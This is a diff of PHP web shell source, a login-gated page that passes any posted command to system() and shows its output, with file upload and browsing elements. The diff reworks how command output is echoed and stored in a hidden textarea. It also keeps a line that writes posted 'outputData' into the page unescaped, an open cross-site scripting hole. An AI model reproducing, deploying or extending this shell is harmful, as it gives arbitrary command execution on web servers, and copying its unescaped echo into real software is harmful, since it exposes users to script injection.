@@ -162,10 +162,9 @@ if(!$_SESSION['loggedIn']) {
             <div class="output" id="output">
 			<?php if(isset($_POST['outputData'])) echo $_POST['outputData'];?>
 			<?php if(isset($_POST['command'])&&!empty($_POST['command'])) {
-				disable_ob();
 				echo getUserNameElement() . htmlentities($_POST['command']) . "<br>\n";
 				$command = $_POST['command'];
-				$r = @system($command);
+				@system($command);
 			} ?>
 			</div>
             <div class="input" id="input">
@@ -175,9 +174,7 @@ if(!$_SESSION['loggedIn']) {
 					</div>
                    <textarea name="outputData" style="display:none" id="outD"><?php 
 				   if(isset($_POST['outputData'])) {
-				   $res = htmlentities($_POST['outputData']);
-				   $res .= getUserNameElement() . htmlentities($_POST['command']) . "<br>\n" . $r;
-				   echo $res;
+				   echo htmlentities($_POST['outputData']);
 				   }
 				   ?></textarea>
 				   <input class="inputtext" id="inputtext" type="text" name="command" autocomplete="off" autofocus>
@@ -202,6 +199,7 @@ if(!$_SESSION['loggedIn']) {
             var uploadFormElement = get("#upload");
             var fileBrowserElement = get("#filebrowser");
 			var txtArea = get('#outD');
+			txtArea.innerHTML = outputElement.innerHTML;
             updateInputWidth();
             
                         
